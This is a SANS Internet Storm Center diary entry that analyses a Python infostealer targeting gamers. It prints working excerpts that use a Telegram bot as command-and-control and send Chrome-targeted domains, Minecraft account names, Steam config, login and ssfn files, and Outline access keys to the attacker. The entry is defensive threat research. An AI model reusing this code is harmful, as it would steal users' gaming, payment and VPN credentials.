---
title: Python Infostealer Targeting Gamers, (Wed, Mar 1st)
url: https://isc.sans.edu/diary/rss/29596
source: SANS Internet Storm Center, InfoCON: green
date: 2023-03-02
fetch_date: 2025-10-04T08:28:45.085538
---

# Python Infostealer Targeting Gamers, (Wed, Mar 1st)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29592)
* [next](/diary/29598)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Python Infostealer Targeting Gamers](/forums/diary/Python%2BInfostealer%2BTargeting%2BGamers/29596/)

**Published**: 2023-03-01. **Last Updated**: 2023-03-01 09:15:08 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[1 comment(s)](/diary/Python%2BInfostealer%2BTargeting%2BGamers/29596/#comments)

They are a lot of “gamers” on the Internet. They generate a lot of business around games. Many of them can be downloaded for free, but they have online shops to buy options like extra lives, weapons, suits, packages, etc. Therefore, the business of gaming is very lucrative today[[1](https://newzoo.com/insights/articles/the-games-market-in-2022-the-year-in-numbers)].

I spotted a malicious Python script that acts as an info stealer focusing on gamers! Based on strings found in the code, the attribution goes to Russia (“????????? ??????” can be translated to "a new connection has been established”).

Today, most Python malicious scripts use Discord as a C2, but this one uses Telegram:

```

bot = telebot.TeleBot(base64.b64decode("NTk1OTUwNzYxODpBQUhmNzBRcVBYMkNiNHNjSzkyZGJwZnVhTEVaQlNWdkVRWQ==").decode("utf-8"), parse_mode=None)
```

The script implements the classic code to steal cookies and credentials from a Chrome installation, but it also searches for resources used by gamers.

First, Chrome data is inspected, and only interesting domains are searched:

```

target_domain = [
    "minecraft.net",
    "google.com",
    "live.com",
    "apple.com",
    "twitter.com",
    "spotify.com",
    "discord.com",
    "discord.gg",
    "blockchain.com",
    "coinbase.com",
    "paypal.com",
    "mojang.com",
    "steamcommunity.com",
    "steampowered.com",
    "origin.com",
    "ea.com",
    "ubisoft.com"
]
```

Then, the script searches for the presence of Minecraft:

```

if os.path.isdir(apps["Minecraft"]):
    AccountsPath = apps["Minecraft"] + "launcher_accounts_microsoft_store.json"
    with open(AccountsPath, encoding="utf-8", mode="r") as f:
        file = json.load(f)
    try:
        for account in file["accounts"]:
            ms_username = file["accounts"][account]["username"]
            minecraft_username = file["accounts"][account]["minecraftProfile"]["name"]
            for user in send_to_users:
                bot.send_message(user, f"?Minecraft Installed\n?Microsoft: `{ms_username}`\n?Minecraft: `{minecraft_username}`", parse_mode="MARKDOWN")
    except KeyError:
        pass
```

Steam[[2](https://store.steampowered.com)] is a well-known platform for downloading games. The script tries to exfiltrate useful information from a Steam setup:

```

try:
    steam_reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path_steam, 0, access=winreg.KEY_READ)
    steampath = winreg.EnumValue(steam_reg, 2)[1]
    steam_auto_login = (winreg.EnumValue(steam_reg, 8))[1]
    steam_lang = (winreg.EnumValue(steam_reg, 0))[1]
    steam_config = steampath + "/config/config.vdf"
    steam_users = steampath + "/config/loginusers.vdf"
    steam_ssfn = []
    for filename in os.listdir(steampath):
        if "ssfn" in filename:
            steam_ssfn.append(filename)
    steam_installed = True

except FileNotFoundError:
    steam_auto_login = "not installed"
    steam_lang = "undefined"
    steam_installed = False

send_to_users = [1084445274]

for user in send_to_users:
    bot.send_message(user, f"????????? ?????? `{datetime.datetime.now()}`\n?IP: `{stun.get_ip_info()}`\n?Computer Name:  `{socket.gethostname()}`\n??User:  `{os.getlogin()}`\n?OC:  `{platform.platform()}`\n??Steam Login: `{steam_auto_login}`\n?Steam Language: `{steam_lang}`", parse_mode="MARKDOWN")
    if steam_installed == True:
        bot.send_message(user, "=====STEAM FILES=====", parse_mode="MARKDOWN")
        bot.send_document(user, open(steam_config, "r", encoding="utf-8"), caption="steam_config")
        bot.send_document(user, open(steam_users, "r", encoding="utf-8"), caption="steam_users")
        for filename in steam_ssfn:
            with open(f"{steampath}/{filename}", "rb") as file:
                bot.send_document(user, file, caption=f"`{filename}`", parse_mode="MARKDOWN")
                file.close()
```

They also search for Outline Manager instances:

```

if os.path.isdir(apps["Outline"]):
    AccountsPath = apps["Outline"] + "000003.log"
    with open(AccountsPath, mode="r") as file:
        for string in file.read().splitlines():
            if "accessKey" in string:
                key = string
    reg = re.compile('[^a-zA-Z0-9"@.,:/?-]')
    key = reg.sub('', key)

    for user in send_to_users:
        bot.send_message(user, f"?Outline (LOG): `{key}`", parse_mode="MARKDOWN")
```

Nothing brand new with this sample except it targets gamers. Money is involved with games (sometimes a lot), so they are nice targets for attackers. Stay safe!

[1] <https://newzoo.com/insights/articles/the-games-market-in-2022-the-year-in-numbers>
[2] <https://store.steampowered.com>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Python](/tag.html?tag=Python) [Malware](/tag.html?tag=Malware) [Infostealer](/tag.html?tag=Infostealer) [Games](/tag.html?tag=Games) [Gamers](/tag.html?tag=Gamers)

[1 comment(s)](/diary/Python%2BInfostealer%2BTargeting%2BGamers/29596/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29592)
* [next](/diary/29598)

### Comments

Good info. saw this on a call of duty game from russia. had to factory reset my gaming machine. started acting funky cold medina

#### Anonymous

#### Mar 2nd 2023 2 years ago

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy...